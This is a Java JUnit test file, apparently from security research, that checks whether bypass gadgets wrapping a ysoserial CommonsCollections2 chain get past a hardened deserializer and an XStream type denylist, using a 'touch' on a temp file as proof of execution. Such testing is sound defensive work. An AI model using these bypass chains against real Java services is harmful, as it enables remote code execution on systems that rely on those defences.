package serialkiller;

import com.thoughtworks.xstream.XStream;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.junit.Test;
import org.junit.Assert;
import serialkiller.bypass.*;
import serialkiller.util.Serializables;
import ysoserial.payloads.CommonsCollections2;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class BypassTest {

    @Test
    public void runJavaDeserTests() throws Exception {

        final List<Class<? extends BypassGadget>> bypassClasses = new ArrayList<Class<? extends BypassGadget>>(BypassGadget.getBypassGadgets());
        for (Class<? extends BypassGadget> bypassClass : bypassClasses) {
            String tempDir = System.getProperty("java.io.tmpdir");
            File file = new File(tempDir, "test");
            String command = "touch " + file;
            test_javadeser_bypass(command, bypassClass, CommonsCollections2.class);
        }

    }

    @Test
    public void runXStreamTests() throws Exception {

        final List<Class<? extends BypassGadget>> bypassClasses = new ArrayList<Class<? extends BypassGadget>>(BypassGadget.getBypassGadgets());
        for (Class<? extends BypassGadget> bypassClass : bypassClasses) {
            String tempDir = System.getProperty("java.io.tmpdir");
            File file = new File(tempDir, "test");
            String command = "touch " + file;
            test_xstream_bypass(command, bypassClass, CommonsCollections2.class);
        }

    }

    public static void test_javadeser_bypass(String command, Class bypass_gadget, Class gadget) {
        try {
            BypassGadget bypassGadget = (BypassGadget) bypass_gadget.getConstructor().newInstance();
            if (!bypassGadget.skipTest()) {
                Object payload = bypassGadget.wrapPayload(command, gadget);
                String tempDir = System.getProperty("java.io.tmpdir");
                File file = new File(tempDir, "test");

                System.out.println("Testing JavaDeser bypass: " + bypass_gadget.getSimpleName());
                if (file.exists()){ file.delete(); }
                byte[] bytes = Serializables.serialize(payload);
                Serializables.secure_deserialize(bytes);
                Thread.sleep(500);
                Assert.assertTrue(file.exists());
            }
        } catch (Exception e) {}
    }

    public static void test_xstream_bypass(String command, Class bypass_gadget, Class gadget) {
        try {
            BypassGadget bypassGadget = (BypassGadget) bypass_gadget.getConstructor().newInstance();
            if (!bypassGadget.skipTest()) {
                Object payload = bypassGadget.wrapPayload(command, gadget);
                String tempDir = System.getProperty("java.io.tmpdir");
                File file = new File(tempDir, "test");

                // Test XStream
                if (bypassGadget.bypassXStream()) {
                    System.out.println("Testing XStream bypass: " + bypass_gadget.getSimpleName());
                    if (file.exists()) { file.delete(); }
                    XStream xstream = new XStream();
                    xstream.denyTypes(new Class[]{InvokerTransformer.class});
                    String xml = xstream.toXML(payload);
                    xstream.fromXML(xml);
                    Thread.sleep(500);
                    Assert.assertTrue(file.exists());
                }
            }
        } catch (Exception e) {}
    }
}